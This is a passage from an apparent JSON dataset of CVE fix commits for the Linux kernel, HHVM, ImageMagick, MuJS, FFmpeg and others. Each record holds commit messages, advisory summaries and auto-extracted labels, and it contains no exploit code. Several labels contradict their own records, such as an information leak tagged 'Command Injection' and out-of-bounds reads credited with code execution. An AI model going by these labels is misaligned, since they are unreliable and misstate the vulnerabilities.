pa-pkinit-kx key excahnge when anonymous pkinit is used","Vulnerability Type":"Key Management Errors","Attack Vector":"launch a man-in-the-middle attack and gain access to the communication channel between endpoints","Impact":"obtain sensitive information or further compromise the system","Root Cause":"caused by improper validation of anonymous PKINIT PA-PKINIT-KX key exchange","Attack Type":"local attacker"},{"commit_id":"dbeb9a56a638e3fdcef8b691c2a2967132dae692","cve_id":"CVE-2019-11929","cwe_id":"CWE-119","commit_message":"string_number_format: Correctly handles return value of snprintf\n\nSummary: `snprintf` can return a value greater than the number of bytes copied. In case the first byte of the string is not a digit (could be '-'), size of `tmpstr` was being updated without checking `tmplen`. This resulted in either an assertion error or a heap overflow depending on whether the assertion is compiled or not.\n\nReviewed By: mofarrell, qianxuweiren\n\nDifferential Revision: D17327899\n\nfbshipit-source-id: ee53875d21e02608c6d870388eecf1464de24ff1","summary":"Insufficient boundary checks when formatting numbers in number_format allows read\/write access to out-of-bounds memory, potentially leading to remote code execution. This issue affects HHVM versions prior to 3.30.10, all versions between 4.0.0 and 4.8.5, all versions between 4.9.0 and 4.18.2, and versions 4.19.0, 4.19.1, 4.20.0, 4.20.1, 4.20.2, 4.21.0, 4.22.0, 4.23.0.","commit_message_1":"correctly handle return value of snprintf summary : ` snprintf ` can return a value greater than the number of byte copied","Vulnerability Type":"buffer overflow","Attack Vector":"leading to remote code execution","Impact":"out - of - bounds memory , potentially leading to remote code execution","Root Cause":"caused by insufficient boundary checks when formatting numbers","Attack Type":"remote attacker"},{"commit_id":"f9680d21beaa9eb39d166e8810e29fbafa51ad15","cve_id":"CVE-2019-11926","cwe_id":"CWE-125","commit_message":"exif_scan_JPEG_header: Added length check to prevent information leak\n\nSummary:\n'exif_process_SOFn' assumes that the JPEG header has at least 6 length. On providing a length < 6, this leads to an out of bounds heap read.\n\nFixes CVE-2019-11926\n\nReviewed By: fredemmott\n\nDifferential Revision: D16927050\n\nfbshipit-source-id: 76c4b7c95acbb7852b0435298613d559d94e7270","summary":"Insufficient boundary checks when processing M_SOFx markers from JPEG headers in the GD extension could allow access to out-of-bounds memory via a maliciously constructed invalid JPEG input. This issue affects HHVM versions prior to 3.30.9, all versions between 4.0.0 and 4.8.3, all versions between 4.9.0 and 4.15.2, and versions 4.16.0 to 4.16.3, 4.17.0 to 4.17.2, 4.18.0 to 4.18.1, 4.19.0, 4.20.0 to 4.20.1.","commit_message_1":"added length check to prevent information leak summary : 'exif_process_sofn ' assumes that the jpeg header ha at least <number> length","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a maliciously constructed invalid jpeg input","Impact":"execute arbitrary code","Root Cause":"caused by an out-of-bounds write flaw when processing the M_SOFx markers from JPEG headers","Attack Type":"remote attacker"},{"commit_id":"f1cd34e63c2a0d9702be3d41462db7bfd0ae7da3","cve_id":"CVE-2019-11925","cwe_id":"CWE-125","commit_message":"exif_process_APP12: Fix length calculation for second tag to prevent information leak\n\nSummary:\nbuffer + 2+l1+1 points to the second tag. The maximum length of the buffer is length. Hence, the max length of the tag is length - (2+l1+1). Instead, the length passed is length - 2 - l1 + 1 which leads to a 2 byte overflow. If the last character of buffer is not null, this would lead to an out of bounds read of size 2.\n\nFixes CVE-2019-11925\n\nReviewed By: fredemmott\n\nDifferential Revision: D16930333\n\nfbshipit-source-id: aad9cccaef3c678abc53bfd549aff6b582082a90","summary":"Insufficient boundary checks when processing the JPEG APP12 block marker in the GD extension could allow access to out-of-bounds memory via a maliciously constructed invalid JPEG input. This issue affects HHVM versions prior to 3.30.9, all versions between 4.0.0 and 4.8.3, all versions between 4.9.0 and 4.15.2, and versions 4.16.0 to 4.16.3, 4.17.0 to 4.17.2, 4.18.0 to 4.18.1, 4.19.0, 4.20.0 to 4.20.1.","commit_message_1":"fix length calculation for second tag to prevent information leak summary : buffer + <number>+l1+<number> point to the second tag","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a maliciously constructed invalid jpeg input","Impact":"execute arbitrary code","Root Cause":"caused by an out-of-bounds write flaw when processing the JPEG APP12 block marker","Attack Type":"remote attacker"},{"commit_id":"6bf67137ef1ee5cd70c842b014c322b7deaf994b","cve_id":"CVE-2019-11924","cwe_id":"CWE-400","commit_message":"Reject zero length handshake records.\n\nSummary:\nZero length (all padding) handshake are forbidden by RFC. Allowing\nthese was a regression in D13754697 (2c6f78a).\n\nThis is a partial fix for CVE-2019-11924\n\nReviewed By: xybu\n\nDifferential Revision: D16285100\n\nfbshipit-source-id: 05a19d31ad74601ce89156a0e59517aaad8dd928","summary":"A peer could send empty handshake fragments containing only padding which would be kept in memory until a full handshake was received, resulting in memory exhaustion. This issue affects versions v2019.01.28.00 and above of fizz, until v2019.08.05.00.","commit_message_1":"reject zero length handshake record","Vulnerability Type":"Uncontrolled Resource Consumption","Attack Vector":"By sending empty handshake fragments containing only padding","Impact":"cause a denial of service","Root Cause":"caused by improper input validation","Attack Type":"remote attacker"},{"commit_id":"2f07985bef9fbae124cc63e5c0272e32da4fdaec","cve_id":"CVE-2019-11921","cwe_id":"CWE-787","commit_message":"Fix SEGV in StructuredHeaders::decodeBase64\n\nSummary:\nThe existing code can potentially cause a SEGV due to an out of bounds write.\n\nThis fixes CVE-2019-11921.\n\nReviewed By: knekritz\n\nDifferential Revision: D12983120\n\nfbshipit-source-id: 1d48063595c8d518fd8afcbc941de260af7e37fd","summary":"An out of bounds write is possible via a specially crafted packet in certain configurations of Proxygen due to improper handling of Base64 when parsing malformed binary content in Structured HTTP Headers. This issue affects versions of proxygen prior to v2019.07.22.00.","commit_message_1":"summary : the existing code can potentially cause a segv due to an out of bound write","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"By sending a specially-crafted packet","Impact":"cause a denial of service","Root Cause":"caused by an out-of-bounds write flaw","Attack Type":"remote attacker"},{"commit_id":"a1616a5ac99ede5d605047a9012481ce7ff18b16","cve_id":"CVE-2019-11884","cwe_id":"CWE-77","commit_message":"Bluetooth: hidp: fix buffer overflow\n\nStruct ca is copied from userspace. It is not checked whether the \"name\"\nfield is NULL terminated, which allows local users to obtain potentially\nsensitive information from kernel stack memory, via a HIDPCONNADD command.\n\nThis vulnerability is similar to CVE-2011-1079.\n\nSigned-off-by: Young Xiao <YangX92@hotmail.com>\nSigned-off-by: Marcel Holtmann <marcel@holtmann.org>\nCc: stable@vger.kernel.org","summary":"The do_hidp_sock_ioctl function in net\/bluetooth\/hidp\/sock.c in the Linux kernel before 5.0.15 allows a local user to obtain potentially sensitive information from kernel stack memory via a HIDPCONNADD command, because a name field may not end with a '0' character.","commit_message_1":"hidp : fix buffer overflow struct ca is copied from userspace","Vulnerability Type":"Command Injection","Attack Vector":"via a hidpconnadd command , because a name field may not end with a ' 0 ' character .","Impact":"obtain sensitive information","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"592acbf16821288ecdc4192c47e3774a4c48bb64","cve_id":"CVE-2019-11833","cwe_id":"CWE-200","commit_message":"ext4: zero out the unused memory region in the extent tree block\n\nThis commit zeroes out the unused memory region in the buffer_head\ncorresponding to the extent metablock after writing the extent header\nand the corresponding extent node entries.\n\nThis is done to prevent random uninitialized data from getting into\nthe filesystem when the extent block is synced.\n\nThis fixes CVE-2019-11833.\n\nSigned-off-by: Sriram Rajagopalan <sriramr@arista.com>\nSigned-off-by: Theodore Ts'o <tytso@mit.edu>\nCc: stable@kernel.org","summary":"fs\/ext4\/extents.c in the Linux kernel through 5.1.2 does not zero out the unused memory region in the extent tree block, which might allow local users to obtain sensitive information by reading uninitialized data in the filesystem.","commit_message_1":"zero out the unused memory region in the extent tree block this commit zero out the unused memory region in the buffer_head corresponding to the extent metablock after writing the extent header and the corresponding extent node entry","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by reading uninitialized data in the filesystem","Impact":"obtain sensitive information","Root Cause":"does not zero out the unused memory region","Attack Type":"local attacker"},{"commit_id":"401e7e88d4ef80188ffa07095ac00456f901b8c4","cve_id":"CVE-2019-11811","cwe_id":"CWE-416","commit_message":"ipmi_si: fix use-after-free of resource->name\n\nWhen we excute the following commands, we got oops\nrmmod ipmi_si\ncat \/proc\/ioports\n\n[ 1623.482380] Unable to handle kernel paging request at virtual address ffff00000901d478\n[ 1623.482382] Mem abort info:\n[ 1623.482383]   ESR = 0x96000007\n[ 1623.482385]   Exception class = DABT (current EL), IL = 32 bits\n[ 1623.482386]   SET = 0, FnV = 0\n[ 1623.482387]   EA = 0, S1PTW = 0\n[ 1623.482388] Data abort info:\n[ 1623.482389]   ISV = 0, ISS = 0x00000007\n[ 1623.482390]   CM = 0, WnR = 0\n[ 1623.482393] swapper pgtable: 4k pages, 48-bit VAs, pgdp = 00000000d7d94a66\n[ 1623.482395] [ffff00000901d478] pgd=000000dffbfff003, pud=000000dffbffe003, pmd=0000003f5d06e003, pte=0000000000000000\n[ 1623.482399] Internal error: Oops: 96000007 [#1] SMP\n[ 1623.487407] Modules linked in: ipmi_si(E) nls_utf8 isofs rpcrdma ib_iser ib_srpt target_core_mod ib_srp scsi_transport_srp ib_ipoib rdma_ucm ib_umad rdma_cm ib_cm dm_mirror dm_region_hash dm_log iw_cm dm_mod aes_ce_blk crypto_simd cryptd aes_ce_cipher ses ghash_ce sha2_ce enclosure sha256_arm64 sg sha1_ce hisi_sas_v2_hw hibmc_drm sbsa_gwdt hisi_sas_main ip_tables mlx5_ib ib_uverbs marvell ib_core mlx5_core ixgbe mdio hns_dsaf ipmi_devintf hns_enet_drv ipmi_msghandler hns_mdio [last unloaded: ipmi_si]\n[ 1623.532410] CPU: 30 PID: 11438 Comm: cat Kdump: loaded Tainted: G            E     5.0.0-rc3+ #168\n[ 1623.541498] Hardware name: Huawei TaiShan 2280 \/BC11SPCD, BIOS 1.37 11\/21\/2017\n[ 1623.548822] pstate: a0000005 (NzCv daif -PAN -UAO)\n[ 1623.553684] pc : string+0x28\/0x98\n[ 1623.557040] lr : vsnprintf+0x368\/0x5e8\n[ 1623.560837] sp : ffff000013213a80\n[ 1623.564191] x29: ffff000013213a80 x28: ffff00001138abb5\n[ 1623.569577] x27: ffff000013213c18 x26: ffff805f67d06049\n[ 1623.574963] x25: 0000000000000000 x24: ffff00001138abb5\n[ 1623.580349] x23: 0000000000000fb7 x22: ffff0000117ed000\n[ 1623.585734] x21: ffff000011188fd8 x20: ffff805f67d07000\n[ 1623.591119] x19: ffff805f67d06061 x18: ffffffffffffffff\n[ 1623.596505] x17: 0000000000000200 x16: 0000000000000000\n[ 1623.601890] x15: ffff0000117ed748 x14: ffff805f67d07000\n[ 1623.607276] x13: ffff805f67d0605e x12: 0000000000000000\n[ 1623.612661] x11: 0000000000000000 x10: 0000000000000000\n[ 1623.618046] x9 : 0000000000000000 x8 : 000000000000000f\n[ 1623.623432] x7 : ffff805f67d06061 x6 : fffffffffffffffe\n[ 1623.628817] x5 : 0000000000000012 x4 : ffff00000901d478\n[ 1623.634203] x3 : ffff0a00ffffff04 x2 : ffff805f67d07000\n[ 1623.639588] x1 : ffff805f67d07000 x0 : ffffffffffffffff\n[ 1623.644974] Process cat (pid: 11438, stack limit = 0x000000008d4cbc10)\n[ 1623.651592] Call trace:\n[ 1623.654068]  string+0x28\/0x98\n[ 1623.657071]  vsnprintf+0x368\/0x5e8\n[ 1623.660517]  seq_vprintf+0x70\/0x98\n[ 1623.668009]  seq_printf+0x7c\/0xa0\n[ 1623.675530]  r_show+0xc8\/0xf8\n[ 1623.682558]  seq_read+0x330\/0x440\n[ 1623.689877]  proc_reg_read+0x78\/0xd0\n[ 1623.697346]  __vfs_read+0x60\/0x1a0\n[ 1623.704564]  vfs_read+0x94\/0x150\n[ 1623.711339]  ksys_read+0x6c\/0xd8\n[ 1623.717939]  __arm64_sys_read+0x24\/0x30\n[ 1623.725077]  el0_svc_common+0x120\/0x148\n[ 1623.732035]  el0_svc_handler+0x30\/0x40\n[ 1623.738757]  el0_svc+0x8\/0xc\n[ 1623.744520] Code: d1000406 aa0103e2 54000149 b4000080 (39400085)\n[ 1623.753441] ---[ end trace f91b6a4937de9835 ]---\n[ 1623.760871] Kernel panic - not syncing: Fatal exception\n[ 1623.768935] SMP: stopping secondary CPUs\n[ 1623.775718] Kernel Offset: disabled\n[ 1623.781998] CPU features: 0x002,21006008\n[ 1623.788777] Memory Limit: none\n[ 1623.798329] Starting crashdump kernel...\n[ 1623.805202] Bye!\n\nIf io_setup is called successful in try_smi_init() but try_smi_init()\ngoes out_err before calling ipmi_register_smi(), so ipmi_unregister_smi()\nwill not be called while removing module. It leads to the resource that\nallocated in io_setup() can not be freed, but the name(DEVICE_NAME) of\nresource is freed while removing the module. It causes use-after-free\nwhen cat \/proc\/ioports.\n\nFix this by calling io_cleanup() while try_smi_init() goes to out_err.\nand don't call io_cleanup() until io_setup() returns successful to avoid\nwarning prints.\n\nFixes: 93c303d2045b (\"ipmi_si: Clean up shutdown a bit\")\nCc: stable@vger.kernel.org\nReported-by: NuoHan Qiao <qiaonuohan@huawei.com>\nSuggested-by: Corey Minyard <cminyard@mvista.com>\nSigned-off-by: Yang Yingliang <yangyingliang@huawei.com>\nSigned-off-by: Corey Minyard <cminyard@mvista.com>","summary":"An issue was discovered in the Linux kernel before 5.0.4. There is a use-after-free upon attempted read access to \/proc\/ioports after the ipmi_si module is removed, related to drivers\/char\/ipmi\/ipmi_si_intf.c, drivers\/char\/ipmi\/ipmi_si_mem_io.c, and drivers\/char\/ipmi\/ipmi_si_port_io.c.","commit_message_1":"fix use-after-free of resource- > name when we excute the following command , we got oops rmmod ipmi_si cat \/proc\/ioports [ <file> ] unable to handle kernel paging request at virtual address ffff00000901d478 [ <file> ] mem abort info : [ <file> ] esr = 0x96000007 [ <file> ] exception class = dabt ( current el ) , il = <number> bit [ <file> ] set = <number> , fnv = <number> [ <file> ] ea = <number> , s1ptw = <number> [ <file> ] data abort info : [ <file> ] isv = <number> , i = 0x00000007 [ <file> ] cm = <number> , wnr = <number> [ <file> ] swapper pgtable : 4k page , <number>-bit va , pgdp = 00000000d7d94a66 [ <file> ] [ ffff00000901d478 ] pgd=000000dffbfff003 , pud=000000dffbffe003 , pmd=0000003f5d06e003 , pte=<number> [ <file> ] internal error : oops : <number> [ # <number> ] smp [ <file> ] module linked in : ipmi_si ( e ) nls_utf8 isofs rpcrdma ib_iser ib_srpt target_core_mod ib_srp scsi_transport_srp ib_ipoib rdma_ucm ib_umad rdma_cm ib_cm dm_mirror dm_region_hash dm_log iw_cm dm_mod aes_ce_blk crypto_simd cryptd aes_ce_cipher s ghash_ce sha2_ce enclosure sha256_arm64 sg sha1_ce hisi_sas_v2_hw hibmc_drm sbsa_gwdt hisi_sas_main ip_tables mlx5_ib ib_uverbs marvell ib_core mlx5_core ixgbe mdio hns_dsaf ipmi_devintf hns_enet_drv ipmi_msghandler hns_mdio [ last unloaded : ipmi_si ] [ <file> ] cpu : <number> pid : <number> comm : cat kdump : loaded tainted : g e <file>","Vulnerability Type":"Use After Free","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by a use-after-free when the ipmi_si module is removed","Attack Type":"local attacker"},{"commit_id":"bcf3b67d16a4c8ffae0aa79de5853435e683945c","cve_id":"CVE-2019-11810","cwe_id":"CWE-476","commit_message":"scsi: megaraid_sas: return error when create DMA pool failed\n\nwhen create DMA pool for cmd frames failed, we should return -ENOMEM,\ninstead of 0.\nIn some case in:\n\n    megasas_init_adapter_fusion()\n\n    -->megasas_alloc_cmds()\n       -->megasas_create_frame_pool\n          create DMA pool failed,\n        --> megasas_free_cmds() [1]\n\n    -->megasas_alloc_cmds_fusion()\n       failed, then goto fail_alloc_cmds.\n    -->megasas_free_cmds() [2]\n\nwe will call megasas_free_cmds twice, [1] will kfree cmd_list,\n[2] will use cmd_list.it will cause a problem:\n\nUnable to handle kernel NULL pointer dereference at virtual address\n00000000\npgd = ffffffc000f70000\n[00000000] *pgd=0000001fbf893003, *pud=0000001fbf893003,\n*pmd=0000001fbf894003, *pte=006000006d000707\nInternal error: Oops: 96000005 [#1] SMP\n Modules linked in:\n CPU: 18 PID: 1 Comm: swapper\/0 Not tainted\n task: ffffffdfb9290000 ti: ffffffdfb923c000 task.ti: ffffffdfb923c000\n PC is at megasas_free_cmds+0x30\/0x70\n LR is at megasas_free_cmds+0x24\/0x70\n ...\n Call trace:\n [<ffffffc0005b779c>] megasas_free_cmds+0x30\/0x70\n [<ffffffc0005bca74>] megasas_init_adapter_fusion+0x2f4\/0x4d8\n [<ffffffc0005b926c>] megasas_init_fw+0x2dc\/0x760\n [<ffffffc0005b9ab0>] megasas_probe_one+0x3c0\/0xcd8\n [<ffffffc0004a5abc>] local_pci_probe+0x4c\/0xb4\n [<ffffffc0004a5c40>] pci_device_probe+0x11c\/0x14c\n [<ffffffc00053a5e4>] driver_probe_device+0x1ec\/0x430\n [<ffffffc00053a92c>] __driver_attach+0xa8\/0xb0\n [<ffffffc000538178>] bus_for_each_dev+0x74\/0xc8\n  [<ffffffc000539e88>] driver_attach+0x28\/0x34\n [<ffffffc000539a18>] bus_add_driver+0x16c\/0x248\n [<ffffffc00053b234>] driver_register+0x6c\/0x138\n [<ffffffc0004a5350>] __pci_register_driver+0x5c\/0x6c\n [<ffffffc000ce3868>] megasas_init+0xc0\/0x1a8\n [<ffffffc000082a58>] do_one_initcall+0xe8\/0x1ec\n [<ffffffc000ca7be8>] kernel_init_freeable+0x1c8\/0x284\n [<ffffffc0008d90b8>] kernel_init+0x1c\/0xe4\n\nSigned-off-by: Jason Yan <yanaijie@huawei.com>\nAcked-by: Sumit Saxena <sumit.saxena@broadcom.com>\nSigned-off-by: Martin K. Petersen <martin.petersen@oracle.com>","summary":"An issue was discovered in the Linux kernel before 5.0.7. A NULL pointer dereference can occur when megasas_create_frame_pool() fails in megasas_alloc_cmds() in drivers\/scsi\/megaraid\/megaraid_sas_base.c. This causes a Denial of Service, related to a use-after-free.","commit_message_1":"megaraid_sas : return error when create dma pool failed when create dma pool for cmd frame failed , we should return -enomem , instead of <number>","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"04f5866e41fb70690e28397487d8bd8eea7d712a","cve_id":"CVE-2019-11599","cwe_id":"CWE-362","commit_message":"coredump: fix race condition between mmget_not_zero()\/get_task_mm() and core dumping\n\nThe core dumping code has always run without holding the mmap_sem for\nwriting, despite that is the only way to ensure that the entire vma\nlayout will not change from under it.  Only using some signal\nserialization on the processes belonging to the mm is not nearly enough.\nThis was pointed out earlier.  For example in Hugh's post from Jul 2017:\n\n  https:\/\/lkml.kernel.org\/r\/alpine.LSU.2.11.1707191716030.2055@eggly.anvils\n\n  \"Not strictly relevant here, but a related note: I was very surprised\n   to discover, only quite recently, how handle_mm_fault() may be called\n   without down_read(mmap_sem) - when core dumping. That seems a\n   misguided optimization to me, which would also be nice to correct\"\n\nIn particular because the growsdown and growsup can move the\nvm_start\/vm_end the various loops the core dump does around the vma will\nnot be consistent if page faults can happen concurrently.\n\nPretty much all users calling mmget_not_zero()\/get_task_mm() and then\ntaking the mmap_sem had the potential to introduce unexpected side\neffects in the core dumping code.\n\nAdding mmap_sem for writing around the ->core_dump invocation is a\nviable long term fix, but it requires removing all copy user and page\nfaults and to replace them with get_dump_page() for all binary formats\nwhich is not suitable as a short term fix.\n\nFor the time being this solution manually covers the places that can\nconfuse the core dump either by altering the vma layout or the vma flags\nwhile it runs.  Once ->core_dump runs under mmap_sem for writing the\nfunction mmget_still_valid() can be dropped.\n\nAllowing mmap_sem protected sections to run in parallel with the\ncoredump provides some minor parallelism advantage to the swapoff code\n(which seems to be safe enough by never mangling any vma field and can\nkeep doing swapins in parallel to the core dumping) and to some other\ncorner case.\n\nIn order to facilitate the backporting I added \"Fixes: 86039bd3b4e6\"\nhowever the side effect of this same race condition in \/proc\/pid\/mem\nshould be reproducible since before 2.6.12-rc2 so I couldn't add any\nother \"Fixes:\" because there's no hash beyond the git genesis commit.\n\nBecause find_extend_vma() is the only location outside of the process\ncontext that could modify the \"mm\" structures under mmap_sem for\nreading, by adding the mmget_still_valid() check to it, all other cases\nthat take the mmap_sem for reading don't need the new check after\nmmget_not_zero()\/get_task_mm().  The expand_stack() in page fault\ncontext also doesn't need the new check, because all tasks under core\ndumping are frozen.\n\nLink: http:\/\/lkml.kernel.org\/r\/20190325224949.11068-1-aarcange@redhat.com\nFixes: 86039bd3b4e6 (\"userfaultfd: add new syscall to provide memory externalization\")\nSigned-off-by: Andrea Arcangeli <aarcange@redhat.com>\nReported-by: Jann Horn <jannh@google.com>\nSuggested-by: Oleg Nesterov <oleg@redhat.com>\nAcked-by: Peter Xu <peterx@redhat.com>\nReviewed-by: Mike Rapoport <rppt@linux.ibm.com>\nReviewed-by: Oleg Nesterov <oleg@redhat.com>\nReviewed-by: Jann Horn <jannh@google.com>\nAcked-by: Jason Gunthorpe <jgg@mellanox.com>\nAcked-by: Michal Hocko <mhocko@suse.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The coredump implementation in the Linux kernel before 5.0.10 does not use locking or other mechanisms to prevent vma layout or vma flags changes while it runs, which allows local users to obtain sensitive information, cause a denial of service, or possibly have unspecified other impact by triggering a race condition with mmget_not_zero or get_task_mm calls. This is related to fs\/userfaultfd.c, mm\/mmap.c, fs\/proc\/task_mmu.c, and drivers\/infiniband\/core\/uverbs_main.c.","commit_message_1":"fix race condition between mmget_not_zero ( ) \/get_task_mm ( ) and core dumping the core dumping code ha always run without holding the mmap_sem for writing , despite that is the only way to ensure that the entire vma layout will not change from under it","Vulnerability Type":"Race Condition","Attack Vector":"by triggering a race condition with mmget _ not _ zero or get _ task _ mm calls","Impact":"obtain sensitive information , cause a denial of service , or possibly have unspecified other impact","Root Cause":"does not use locking or other mechanisms to prevent vma layout or vma flags changes while it runs","Attack Type":"local attacker"},{"commit_id":"d35334f368817a77a6bd1f33c6a5676b2c402c02","cve_id":"CVE-2019-11596","cwe_id":"CWE-476","commit_message":"fix segfault in \"lru\" command\n\nfixes #474 - off by one in token count.","summary":"In memcached before 1.5.14, a NULL pointer dereference was found in the *lru mode* and *lru temp_ttl* commands. This causes a denial of service when parsing crafted lru command messages in process_lru_command in memcached.c.","commit_message_1":"fix segfault in `` lru '' command fix # <number> - off by one in token count","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By sending a specially-crafted message to the memcached service","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"bc6cba3f552c44565f7f1e66dc1580189addb2b4","cve_id":"CVE-2019-11498","cwe_id":"CWE-824","commit_message":"issue #67: make sure sample rate is specified and non-zero in DFF files","summary":"WavpackSetConfiguration64 in pack_utils.c in libwavpack.a in WavPack through 5.1.0 has a *Conditional jump or move depends on uninitialised value* condition, which might allow attackers to cause a denial of service (application crash) via a DFF file that lacks valid sample-rate data.","commit_message_1":"make sure sample rate is specified and non-zero in dff file","Vulnerability Type":"Access of Uninitialized Pointer","Attack Vector":"via a dff file that lacks valid sample - rate data","Impact":"a denial of service ( application crash )","Root Cause":"has a * conditional jump or move depends on uninitialised value * condition , which","Attack Type":"remote attacker"},{"commit_id":"f958d7b528b1b40c44cfda5eabe2d82760d868c3","cve_id":"CVE-2019-11487","cwe_id":"CWE-416","commit_message":"mm: make page ref count overflow check tighter and more explicit\n\nWe have a VM_BUG_ON() to check that the page reference count doesn't\nunderflow (or get close to overflow) by checking the sign of the count.\n\nThat's all fine, but we actually want to allow people to use a \"get page\nref unless it's already very high\" helper function, and we want that one\nto use the sign of the page ref (without triggering this VM_BUG_ON).\n\nChange the VM_BUG_ON to only check for small underflows (or _very_ close\nto overflowing), and ignore overflows which have strayed into negative\nterritory.\n\nAcked-by: Matthew Wilcox <willy@infradead.org>\nCc: Jann Horn <jannh@google.com>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The Linux kernel before 5.1-rc5 allows page->_refcount reference count overflow, with resultant use-after-free issues, if about 140 GiB of RAM exists. This is related to fs\/fuse\/dev.c, fs\/pipe.c, fs\/splice.c, include\/linux\/mm.h, include\/linux\/pipe_fs_i.h, kernel\/trace\/trace.c, mm\/gup.c, and mm\/hugetlb.c. It can occur with FUSE requests.","commit_message_1":"make page ref count overflow check tighter and more explicit we have a vm_bug_on ( ) to check that the page reference count doe n't underflow ( or get close to overflow ) by checking the sign of the count","Vulnerability Type":"Use After Free","Attack Vector":"using FUSE with ~140GiB RAM usage","Impact":"cause a denial of service","Root Cause":"caused by a page->_refcount overflow","Attack Type":"local attacker"},{"commit_id":"f663dfb8431c97d95682a2b533cca1c8233d21b4","cve_id":"CVE-2019-11472","cwe_id":"CWE-369","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1546","summary":"ReadXWDImage in coders\/xwd.c in the XWD image parsing component of ImageMagick 7.0.8-41 Q16 allows attackers to cause a denial-of-service (divide-by-zero error) by crafting an XWD image file in which the header indicates neither LSB first nor MSB first.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Divide By Zero","Attack Vector":"by crafting an xwd image file in which the header indicates neither lsb first nor msb first","Impact":"cause a denial of service","Root Cause":"caused by a divide-by-zero error","Attack Type":"remote attacker"},{"commit_id":"995a4283d8ed2d0d2c1ceb1a577b993df2f0e014","cve_id":"CVE-2019-11471","cwe_id":"CWE-416","commit_message":"Detect non-existing referenced alpha images (fixes #123)","summary":"libheif 1.4.0 has a use-after-free in heif::HeifContext::Image::set_alpha_channel in heif_context.h because heif_context.cc mishandles references to non-existing alpha images.","commit_message_1":"detect non-existing referenced alpha image ( fix # <number> )","Vulnerability Type":"Use After Free","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"e3cdce6fe12193f235b8c0ae5efe6880a25eb957","cve_id":"CVE-2019-11470","cwe_id":"CWE-400","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1472","summary":"The cineon parsing component in ImageMagick 7.0.8-26 Q16 allows attackers to cause a denial-of-service (uncontrolled resource consumption) by crafting a Cineon image with an incorrect claimed image size. This occurs because ReadCINImage in coders\/cin.c lacks a check for insufficient image data in a file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Uncontrolled Resource Consumption","Attack Vector":"by crafting a cineon image with an incorrect claimed image size","Impact":"cause a denial of service","Root Cause":"caused by uncontrolled resource consumption","Attack Type":"remote attacker"},{"commit_id":"00d4606c3baf813b7b1c176823b2729bf51002a2","cve_id":"CVE-2019-11413","cwe_id":"CWE-400","commit_message":"Bug 700937: Limit recursion in regexp matcher.\n\nAlso handle negative return code as an error in the JS bindings.","summary":"An issue was discovered in Artifex MuJS 1.0.5. It has unlimited recursion because the match function in regexp.c lacks a depth check.","commit_message_1":"limit recursion in regexp matcher","Vulnerability Type":"Uncontrolled Resource Consumption","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an unlimited recursion issue","Attack Type":"remote attacker"},{"commit_id":"1e5479084bc9852854feb1ba9bf68b52cd127e02","cve_id":"CVE-2019-11412","cwe_id":"CWE-119","commit_message":"Bug 700947: Add missing ENDTRY opcode in try\/catch\/finally byte code.\n\nIn one of the code branches in handling exceptions in the catch block\nwe forgot to call the ENDTRY opcode to pop the inner hidden try.\nThis leads to an unbalanced exception stack which can cause a crash\ndue to us jumping to a stack frame that has already been exited.","summary":"An issue was discovered in Artifex MuJS 1.0.5. jscompile.c can cause a denial of service (invalid stack-frame jump) because it lacks an ENDTRY opcode call.","commit_message_1":"add missing endtry opcode in try\/catch\/finally byte code","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by the lack of an ENDTRY opcode call","Attack Type":"remote attacker"},{"commit_id":"da632ca08f240590d2dec786722ed08486ce1be6","cve_id":"CVE-2019-11411","cwe_id":"CWE-119","commit_message":"Bug 700938: Fix stack overflow in numtostr as used by Number#toFixed().\n\n32 is not enough to fit sprintf(\"%.20f\", 1e20).\nWe need at least 43 bytes to fit that format.\nBump the static buffer size.","summary":"An issue was discovered in Artifex MuJS 1.0.5. The Number#toFixed() and numtostr implementations in jsnumber.c have a stack-based buffer overflow.","commit_message_1":"fix stack overflow in numtostr a used by number # tofixed ( )","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted content","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"d227ed5d598340e719eff7156b1aa0a4469e9a6a","cve_id":"CVE-2019-11339","cwe_id":"CWE-125","commit_message":"avcodec\/mpeg4videodec: Check idx in mpeg4_decode_studio_block()\n\nFixes: Out of array access\nFixes: 13500\/clusterfuzz-testcase-minimized-ffmpeg_AV_CODEC_ID_MPEG4_fuzzer-5769760178962432\n\nFound-by: continuous fuzzing process https:\/\/github.com\/google\/oss-fuzz\/tree\/master\/projects\/ffmpeg\nReviewed-by: Kieran Kunhya <kierank@obe.tv>\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"The studio profile decoder in libavcodec\/mpeg4videodec.c in FFmpeg 4.0 before 4.0.4 and 4.1 before 4.1.2 allows remote attackers to cause a denial of service (out-of-array access) or possibly have unspecified other impact via crafted MPEG-4 video data.","commit_message_1":"avcodec\/mpeg4videodec : check idx 